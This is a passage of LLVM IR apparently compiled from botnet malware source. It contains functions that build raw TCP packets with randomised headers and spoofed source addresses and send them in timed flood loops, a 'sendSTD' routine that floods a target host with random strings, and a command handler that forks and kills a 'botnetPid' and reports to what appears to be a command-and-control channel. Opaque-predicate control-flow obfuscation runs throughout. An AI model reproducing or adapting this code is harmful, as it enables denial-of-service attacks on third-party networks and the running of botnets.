  br i1 %400, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %392
  %401 = call i32 @rand_cmwc()
  %402 = trunc i32 %401 to i16
  %403 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 0
  %405 = bitcast %union.anon* %404 to %struct.anon.0*
  %406 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %405, i32 0, i32 5
  store i16 %402, i16* %406, align 2
  %407 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 0
  %409 = bitcast %union.anon* %408 to %struct.anon.0*
  %410 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %409, i32 0, i32 6
  store i16 0, i16* %410, align 4
  %411 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 0
  %413 = bitcast %union.anon* %412 to %struct.anon.0*
  %414 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %413, i32 0, i32 7
  store i16 0, i16* %414, align 2
  %415 = load i32, i32* %9, align 4
  %416 = icmp eq i32 %415, 0
  %417 = load i32, i32* @x.93
  %418 = load i32, i32* @y.94
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br i1 %416, label %425, label %427

; <label>:425:                                    ; preds = %originalBBpart2109
  %426 = call i32 @rand_cmwc()
  br label %432

; <label>:427:                                    ; preds = %originalBBpart2109
  %428 = load i32, i32* %9, align 4
  %429 = trunc i32 %428 to i16
  %430 = call zeroext i16 @htons(i16 zeroext %429) #10
  %431 = zext i16 %430 to i32
  br label %432

; <label>:432:                                    ; preds = %427, %425
  %433 = phi i32 [ %426, %425 ], [ %431, %427 ]
  %434 = trunc i32 %433 to i16
  %435 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  %437 = bitcast %union.anon* %436 to %struct.anon.0*
  %438 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %437, i32 0, i32 1
  store i16 %434, i16* %438, align 2
  %439 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %440 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %441 = call zeroext i16 @tcpcsum(%struct.iphdr* %439, %struct.tcphdr* %440)
  %442 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 0
  %444 = bitcast %union.anon* %443 to %struct.anon.0*
  %445 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %444, i32 0, i32 6
  store i16 %441, i16* %445, align 4
  %446 = bitcast i8* %125 to i16*
  %447 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 2
  %449 = load i16, i16* %448, align 2
  %450 = zext i16 %449 to i32
  %451 = call zeroext i16 @csum(i16* %446, i32 %450)
  %452 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 7
  store i16 %451, i16* %453, align 2
  %454 = call i64 @time(i64* null) #3
  %455 = load i32, i32* %10, align 4
  %456 = sext i32 %455 to i64
  %457 = add nsw i64 %454, %456
  %458 = trunc i64 %457 to i32
  store i32 %458, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %459

; <label>:459:                                    ; preds = %originalBBpart2117, %512, %432
  br label %460

; <label>:460:                                    ; preds = %459
  %461 = load i32, i32* %17, align 4
  %462 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %463 = call i64 @sendto(i32 %461, i8* %125, i64 %123, i32 0, %struct.sockaddr* %462, i32 16)
  %464 = load i32, i32* %19, align 4
  %465 = call i32 @GRIP(i32 %464)
  %466 = call i32 @htonl(i32 %465) #10
  %467 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 8
  store i32 %466, i32* %468, align 4
  %469 = call i32 @rand_cmwc()
  %470 = trunc i32 %469 to i16
  %471 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %472 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %471, i32 0, i32 3
  store i16 %470, i16* %472, align 4
  %473 = call i32 @rand_cmwc()
  %474 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 0
  %476 = bitcast %union.anon* %475 to %struct.anon.0*
  %477 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %476, i32 0, i32 2
  store i32 %473, i32* %477, align 4
  %478 = call i32 @rand_cmwc()
  %479 = trunc i32 %478 to i16
  %480 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %481 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %480, i32 0, i32 0
  %482 = bitcast %union.anon* %481 to %struct.anon.0*
  %483 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %482, i32 0, i32 0
  store i16 %479, i16* %483, align 4
  %484 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 0
  %486 = bitcast %union.anon* %485 to %struct.anon.0*
  %487 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %486, i32 0, i32 6
  store i16 0, i16* %487, align 4
  %488 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %489 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %490 = call zeroext i16 @tcpcsum(%struct.iphdr* %488, %struct.tcphdr* %489)
  %491 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %492 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %491, i32 0, i32 0
  %493 = bitcast %union.anon* %492 to %struct.anon.0*
  %494 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %493, i32 0, i32 6
  store i16 %490, i16* %494, align 4
  %495 = bitcast i8* %125 to i16*
  %496 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 2
  %498 = load i16, i16* %497, align 2
  %499 = zext i16 %498 to i32
  %500 = call zeroext i16 @csum(i16* %495, i32 %499)
  %501 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %502 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %501, i32 0, i32 7
  store i16 %500, i16* %502, align 2
  %503 = load i32, i32* %25, align 4
  %504 = load i32, i32* %15, align 4
  %505 = icmp eq i32 %503, %504
  br i1 %505, label %506, label %513

; <label>:506:                                    ; preds = %460
  %507 = call i64 @time(i64* null) #3
  %508 = load i32, i32* %24, align 4
  %509 = sext i32 %508 to i64
  %510 = icmp sgt i64 %507, %509
  br i1 %510, label %511, label %512

; <label>:511:                                    ; preds = %506
  br label %532

; <label>:512:                                    ; preds = %506
  store i32 0, i32* %25, align 4
  br label %459

; <label>:513:                                    ; preds = %460
  %514 = load i32, i32* @x.93
  %515 = load i32, i32* @y.94
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %513
  %522 = load i32, i32* %25, align 4
  %523 = add i32 %522, 1
  store i32 %523, i32* %25, align 4
  %524 = load i32, i32* @x.93
  %525 = load i32, i32* @y.94
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBBpart2117, label %originalBB111alteredBB

originalBBpart2117:                               ; preds = %originalBB111
  br label %459

; <label>:532:                                    ; preds = %511
  %533 = load i32, i32* @x.93
  %534 = load i32, i32* @y.94
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %532
  %541 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %541)
  %542 = load i32, i32* @x.93
  %543 = load i32, i32* @y.94
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br label %550

; <label>:550:                                    ; preds = %originalBBpart2121, %91, %83, %originalBBpart2
  %551 = load i32, i32* @x.93
  %552 = load i32, i32* @y.94
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %550
  %559 = load i32, i32* @x.93
  %560 = load i32, i32* @y.94
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %567 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %568 = getelementptr inbounds [8 x i8], [8 x i8]* %567, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %568, i8 0, i64 8, i32 4, i1 false)
  %569 = call i32 @socket(i32 2, i32 3, i32 6) #3
  store i32 %569, i32* %17, align 4
  %570 = load i32, i32* %17, align 4
  %571 = icmp ne i32 %570, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %97
  store i32 0, i32* %19, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %167
  %572 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %573 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %572, i32 0, i32 0
  %574 = bitcast %union.anon* %573 to %struct.anon.0*
  %575 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %574, i32 0, i32 4
  %576 = load i16, i16* %575, align 4
  %_ = sub i16 %576, -513
  %gen = mul i16 %_, -513
  %_11 = shl i16 %576, -513
  %_12 = sub i16 0, %576
  %gen13 = add i16 %_12, -513
  %577 = and i16 %576, -513
  %_14 = sub i16 0, %577
  %gen15 = add i16 %_14, 512
  %_16 = sub i16 %577, 512
  %gen17 = mul i16 %_16, 512
  %578 = or i16 %577, 512
  store i16 %578, i16* %575, align 4
  %579 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 0
  %581 = bitcast %union.anon* %580 to %struct.anon.0*
  %582 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %581, i32 0, i32 4
  %583 = load i16, i16* %582, align 4
  %_18 = shl i16 %583, -1025
  %_19 = sub i16 %583, -1025
  %gen20 = mul i16 %_19, -1025
  %584 = and i16 %583, -1025
  %_21 = sub i16 0, %584
  %gen22 = add i16 %_21, 1024
  %_23 = sub i16 0, %584
  %gen24 = add i16 %_23, 1024
  %_25 = shl i16 %584, 1024
  %_26 = sub i16 0, %584
  %gen27 = add i16 %_26, 1024
  %585 = or i16 %584, 1024
  store i16 %585, i16* %582, align 4
  %586 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 0
  %588 = bitcast %union.anon* %587 to %struct.anon.0*
  %589 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %588, i32 0, i32 4
  %590 = load i16, i16* %589, align 4
  %591 = and i16 %590, -257
  %_28 = sub i16 0, %591
  %gen29 = add i16 %_28, 256
  %_30 = shl i16 %591, 256
  %592 = or i16 %591, 256
  store i16 %592, i16* %589, align 4
  %593 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %594 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %593, i32 0, i32 0
  %595 = bitcast %union.anon* %594 to %struct.anon.0*
  %596 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %595, i32 0, i32 4
  %597 = load i16, i16* %596, align 4
  %_31 = sub i16 %597, -4097
  %gen32 = mul i16 %_31, -4097
  %_33 = sub i16 0, %597
  %gen34 = add i16 %_33, -4097
  %_35 = shl i16 %597, -4097
  %_36 = sub i16 %597, -4097
  %gen37 = mul i16 %_36, -4097
  %_38 = sub i16 %597, -4097
  %gen39 = mul i16 %_38, -4097
  %_40 = sub i16 0, %597
  %gen41 = add i16 %_40, -4097
  %_42 = sub i16 %597, -4097
  %gen43 = mul i16 %_42, -4097
  %_44 = sub i16 0, %597
  %gen45 = add i16 %_44, -4097
  %_46 = sub i16 %597, -4097
  %gen47 = mul i16 %_46, -4097
  %598 = and i16 %597, -4097
  %599 = or i16 %598, 4096
  store i16 %599, i16* %596, align 4
  %600 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %601 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %600, i32 0, i32 0
  %602 = bitcast %union.anon* %601 to %struct.anon.0*
  %603 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %602, i32 0, i32 4
  %604 = load i16, i16* %603, align 4
  %_48 = sub i16 %604, -2049
  %gen49 = mul i16 %_48, -2049
  %605 = and i16 %604, -2049
  %_50 = sub i16 0, %605
  %gen51 = add i16 %_50, 2048
  %_52 = sub i16 %605, 2048
  %gen53 = mul i16 %_52, 2048
  %_54 = shl i16 %605, 2048
  %_55 = sub i16 0, %605
  %gen56 = add i16 %_55, 2048
  %_57 = shl i16 %605, 2048
  %_58 = sub i16 0, %605
  %gen59 = add i16 %_58, 2048
  %606 = or i16 %605, 2048
  store i16 %606, i16* %603, align 4
  br label %originalBB10

originalBB63alteredBB:                            ; preds = %originalBB63, %225
  %607 = load i8*, i8** %23, align 8
  %608 = call i32 @strcmp(i8* %607, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.255, i32 0, i32 0)) #9
  %609 = icmp ne i32 %608, 0
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %277
  %610 = load i8*, i8** %23, align 8
  %611 = call i32 @strcmp(i8* %610, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.258, i32 0, i32 0)) #9
  %612 = icmp ne i32 %611, 0
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %305
  %613 = load i8*, i8** %23, align 8
  %614 = call i32 @strcmp(i8* %613, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.259, i32 0, i32 0)) #9
  %615 = icmp ne i32 %614, 0
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %325
  %616 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %617 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %616, i32 0, i32 0
  %618 = bitcast %union.anon* %617 to %struct.anon.0*
  %619 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %618, i32 0, i32 4
  %620 = load i16, i16* %619, align 4
  %_76 = sub i16 %620, -2049
  %gen77 = mul i16 %_76, -2049
  %_78 = sub i16 0, %620
  %gen79 = add i16 %_78, -2049
  %_80 = sub i16 %620, -2049
  %gen81 = mul i16 %_80, -2049
  %_82 = shl i16 %620, -2049
  %621 = and i16 %620, -2049
  %_83 = sub i16 0, %621
  %gen84 = add i16 %_83, 2048
  %_85 = shl i16 %621, 2048
  %_86 = shl i16 %621, 2048
  %_87 = sub i16 %621, 2048
  %gen88 = mul i16 %_87, 2048
  %_89 = shl i16 %621, 2048
  %_90 = sub i16 0, %621
  %gen91 = add i16 %_90, 2048
  %_92 = sub i16 0, %621
  %gen93 = add i16 %_92, 2048
  %_94 = sub i16 %621, 2048
  %gen95 = mul i16 %_94, 2048
  %622 = or i16 %621, 2048
  store i16 %622, i16* %619, align 4
  br label %originalBB75

originalBB99alteredBB:                            ; preds = %originalBB99, %349
  %623 = load i32, i32* @KadenCommStock, align 4
  %624 = load i8*, i8** %23, align 8
  %625 = call i32 (i32, i8*, ...) @botnetPrint(i32 %623, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.260, i32 0, i32 0), i8* %624)
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %371
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %392
  %626 = call i32 @rand_cmwc()
  %627 = trunc i32 %626 to i16
  %628 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %629 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %628, i32 0, i32 0
  %630 = bitcast %union.anon* %629 to %struct.anon.0*
  %631 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %630, i32 0, i32 5
  store i16 %627, i16* %631, align 2
  %632 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %633 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %632, i32 0, i32 0
  %634 = bitcast %union.anon* %633 to %struct.anon.0*
  %635 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %634, i32 0, i32 6
  store i16 0, i16* %635, align 4
  %636 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %637 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %636, i32 0, i32 0
  %638 = bitcast %union.anon* %637 to %struct.anon.0*
  %639 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %638, i32 0, i32 7
  store i16 0, i16* %639, align 2
  %640 = load i32, i32* %9, align 4
  %641 = icmp eq i32 %640, 0
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %513
  %642 = load i32, i32* %25, align 4
  %_112 = sub i32 %642, 1
  %gen113 = mul i32 %_112, 1
  %_114 = sub i32 0, %642
  %gen115 = add i32 %_114, 1
  %643 = add i32 %642, 1
  store i32 %643, i32* %25, align 4
  br label %originalBB111

originalBB119alteredBB:                           ; preds = %originalBB119, %532
  %644 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %644)
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %550
  br label %originalBB123
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #3
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #3
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %64, %3
  %39 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %40 = call i32 @rand() #3
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 36
  %43 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = call i64 @send(i32 %48, i8* %49, i64 69, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i64 @time(i64* null) #3
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = add nsw i64 %55, %57
  %59 = icmp sge i64 %54, %58
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %47
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @close(i32 %61)
  call void @_exit(i32 0) #12
  unreachable

; <label>:63:                                     ; preds = %47
  store i32 0, i32* %11, align 4
  br label %64

; <label>:64:                                     ; preds = %63, %38
  %65 = load i32, i32* %11, align 4
  %66 = add i32 %65, 1
  store i32 %66, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  %68 = load i32, i32* @x.95
  %69 = load i32, i32* @y.96
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %67
  %76 = load i32, i32* @x.95
  %77 = load i32, i32* @y.96
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %67
  br label %originalBB
}

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = load i32, i32* @x.97
  %4 = load i32, i32* @y.98
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i64, align 8
  store i32 %0, i32* %11, align 4
  store i8** %1, i8*** %12, align 8
  %39 = load i8**, i8*** %12, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @strcmp(i8* %41, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.297, i32 0, i32 0)) #9
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.97
  %45 = load i32, i32* @y.98
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %138, label %52

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i8**, i8*** %12, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.298, i32 0, i32 0)) #9
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %81, label %58

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* @x.97
  %60 = load i32, i32* @y.98
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  %67 = load i32, i32* @botnetPid, align 4
  %68 = icmp eq i32 %67, 0
  %69 = load i32, i32* @x.97
  %70 = load i32, i32* @y.98
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %68, label %77, label %78

; <label>:77:                                     ; preds = %originalBBpart24
  br label %1059

; <label>:78:                                     ; preds = %originalBBpart24
  %79 = load i32, i32* @botnetPid, align 4
  %80 = call i32 @kill(i32 %79, i32 9) #3
  store i32 0, i32* @botnetPid, align 4
  br label %81

; <label>:81:                                     ; preds = %78, %52
  %82 = load i8**, i8*** %12, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 1
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @strcmp(i8* %84, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.299, i32 0, i32 0)) #9
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %121, label %87

; <label>:87:                                     ; preds = %81
  %88 = load i32, i32* @botnetPid, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %87
  br label %1059

; <label>:91:                                     ; preds = %87
  %92 = call i32 @fork() #3
  store i32 %92, i32* %13, align 4
  store i32 1000, i32* %14, align 4
  store i32 10, i32* %15, align 4
  %93 = load i32, i32* %13, align 4
  %94 = icmp ugt i32 %93, 0
  br i1 %94, label %95, label %113

; <label>:95:                                     ; preds = %91
  %96 = load i32, i32* @x.97
  %97 = load i32, i32* @y.98
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %95
  %104 = load i32, i32* %13, align 4
  store i32 %104, i32* @botnetPid, align 4
  %105 = load i32, i32* @x.97
  %106 = load i32, i32* @y.98
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %1059

; <label>:113:                                    ; preds = %91
  %114 = load i32, i32* %13, align 4
